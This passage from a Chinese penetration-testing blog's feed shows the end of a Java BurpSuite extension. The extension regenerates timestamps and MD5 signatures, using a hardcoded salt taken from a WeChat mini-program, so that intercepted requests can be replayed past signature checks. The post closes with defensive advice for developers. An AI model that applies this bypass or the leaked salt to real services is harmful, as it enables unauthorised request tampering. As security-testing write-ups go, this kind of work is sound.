comment">//计算当前的时间戳和签名值</span>            <span class="token keyword">long</span> new_time <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> new_sign <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BurpExtender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toMD5</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>new_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//提取原始请求中的时间戳和签名值</span>            <span class="token keyword">int</span> time_start <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"&amp;timestamp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> oldtimestamp <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>time_start <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> time_start <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> sign_start <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"&amp;signature="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> oldsign <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>sign_start <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> sign_start <span class="token operator">+</span> <span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//替换原始请求中的时间戳和签名值</span>            body <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>oldtimestamp<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>new_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            body <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>oldsign<span class="token punctuation">,</span> new_sign<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//修改后的数据替换原始的请求包</span>            <span class="token class-name">String</span> newBody <span class="token operator">=</span> body<span class="token punctuation">;</span>            stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"After change:\n"</span> <span class="token operator">+</span> newBody<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//重构数据包的目的是因为修改完请求体body后，需要将请求头head和请求体body重新拼接起来后再发送给服务器</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bodyByte <span class="token operator">=</span> newBody<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> new_Request <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> bodyByte<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//stdout.println("After change:\n" + new String(new_Request));</span>            messageInfo<span class="token punctuation">.</span><span class="token function">setRequest</span><span class="token punctuation">(</span>new_Request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//处理返回数据包</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token class-name">Handle_Response_Packet</span><span class="token punctuation">(</span><span class="token class-name">IHttpRequestResponse</span> messageInfo<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//忽略，无需做任何处理</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toMD5</span><span class="token punctuation">(</span><span class="token class-name">String</span> plainText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//生成实现指定摘要算法的 MessageDigest 对象。</span>            <span class="token class-name">MessageDigest</span> md <span class="token operator">=</span> <span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            plainText<span class="token operator">=</span><span class="token string">"SvZy7GUy5mqWk15l4F3Ivb1IXCWOhnAm"</span><span class="token operator">+</span>plainText<span class="token punctuation">;</span>            <span class="token comment">//使用指定的字节数组更新摘要。</span>            md<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>plainText<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//通过执行诸如填充之类的最终操作完成哈希计算。</span>            <span class="token keyword">byte</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> md<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//生成具体的md5密码到buf数组</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token class-name">StringBuffer</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> offset <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>length<span class="token punctuation">;</span> offset<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                i <span class="token operator">=</span> b<span class="token punctuation">[</span>offset<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">256</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span>                    buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> plainText<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>来看看不使用插件的情况下，直接重放上面的数据包的结果：</p><p><img src="https://img-blog.csdnimg.cn/20210204171631332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>最后上大招，从 IDEA 导出、生成 jar 插件文件并导入 BurpSuite：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204172014399.png" alt="在这里插入图片描述" loading="lazy"><br>下面就是见证奇迹的时候了！来看看这时候重放数据包的效果：</p><p><img src="https://img-blog.csdnimg.cn/20210204172039663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>成功重放hh，同时可以在插件的输出日志里查看到时间戳和签名值的自动替换记录：</p><p><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/20210204172115473.png" alt="在这里插入图片描述" loading="lazy"><br>至此，就可以愉快地继续进行渗透测试啦！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次测试过程从0到1接触了微信小程序的逆向，首先通过审计分析出计算参数签名的源码逻辑，接着编写了自动计算的时间戳和签名值的脚本，再到最后开发 BurpSuite 自动化插件，这过程也算小有收获了。</p><p>最后总结下进一步思考的几个问题：</p><ol><li>实际上很多进行参数签名校验的系统的会采用对整个数据包的参数进行签名的方式，而非像本文所述的案例（只是对时间戳进行 MD5 哈希加盐），具体的签名算法破解需要逆向分析不同系统的源码；</li><li>时间戳和参数签名确实是防止数据篡改、重放的有力措施，而这个过程安全性的保障的核心在于防止签名算法中的加密密钥 secret （即本文案例中的硬编码盐值）泄露；</li><li>开发人员可通过对微信小程序客户端进行安全加固（如代码混淆）的方式来增加攻击者分析、获取加密密钥的难度。</li></ol><p>从本次测试也可以看出，开发人员不应该过度依赖客户端参数签名机制抵御网络攻击，应该着重于重视、强化服务端代码自身业务逻辑的安全性！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文首发于 &lt;a href=&quot;https://www.freebuf.com/articles/web/263394.html&quot;&gt;Freeb</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://tr0e.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
</feed>
